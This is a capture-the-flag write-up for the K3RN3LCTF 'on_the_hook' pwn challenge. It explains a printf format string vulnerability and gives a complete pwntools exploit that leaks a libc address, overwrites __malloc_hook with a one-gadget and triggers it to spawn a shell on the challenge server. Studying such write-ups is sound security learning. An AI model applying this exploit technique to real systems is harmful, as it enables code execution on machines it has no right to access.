--- 
layout: post 
title:  "[K3RN3LCTF] on_the_hook"
date: "2021-11-15" 
categories: [Pwn, Fsb]
author: eurus 
---


This is the output of the checksec over the ELF of this challenge.

```
Arch:     i386-32-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

We can see from the main function that the program is a simple echo server.
But it use ```printf(s)``` and since the user can control the format string
of the printf we have here a **format string vulnerability**.

```c
int main(){

  char s[64];

  init();
  puts("echo:");
  for ( int i = 1; i <= 5; ++i ){
    fgets(s, 64, stdin);
    printf(s);
  }
  exit(0);
}
```

So we have 5 possible read or write operation.

This is the plan:
1. leak a libc address (Here i have leaked the return address of the main)
2. use the address leaked to find the address of the ```__malloc_hook```
3. use the format string vulnerability to write into the ```__malloc_hook``` the address of a one gadget
4. force the printf to allocate memory forcing to print a long string

we dont need to leak the version of the glibc version since the author of the challenge gave us the libc used on the server.


```
.text:0001862B                 push    [esp+64h+ubp_av] 
.text:0001862F                 push    [esp+68h+argc]  
.text:00018633                 call    [esp+6Ch+main]  ; call the main function
.text:00018637                 add     esp, 10h        ; return address of the main 0x18637 
.text:0001863A
.text:0001863A loc_1863A:                              
.text:0001863A                 sub     esp, 0Ch
.text:0001863D                 push    eax             
.text:0001863E                 call    exit
```



For semplicity I have used the fmtstr_payload function of the pwntools library.

From the pwntools documentation:
```
    pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, write_size='byte') → str
```

    Makes payload with given parameter. It can generate payload for 32 or 64 bits architectures. The size of the addr is taken from context.bits
```   
    offset (int) – the first formatter’s offset you control
    writes (dict) – dict with addr, value {addr: value, addr2: value2}
```


So this is the final exploit.

```python
from pwn import *

context.binary = elf = ELF('./on_the_hook')
libc = ELF('./libc.so.6')

#p = elf.process()
p = remote('ctf.k3rn3l4rmy.com', 2201)
p.recvline()

def leakat(i, p):
    p.sendline(f'%{i}$p')
    rec = p.recvline()
    leak = str(rec[:-1])[2:-1]
    log.info(f'@ {i}: {leak}')
    return leak

ret_libc = leakat(27, p)

print(ret_libc)
libc.address = int(ret_libc,16) - 0x18637
log.success(f'Libc base @ {hex(libc.address)}')
log.info(f'malloc hook @ {hex(libc.sym.__malloc_hook)}')

one1 = libc.address + 0x3ac5c
one2 = libc.address + 0x3ac5e
one3 = libc.address + 0x3ac62
one4 = libc.address + 0x3ac69
one5 = libc.address + 0x5fbc5
one6 = libc.address + 0x5fbc6


p.sendline(fmtstr_payload(7,{libc.sym.__malloc_hook:one3}))
p.sendline('%99999c')
p.interactive()
```


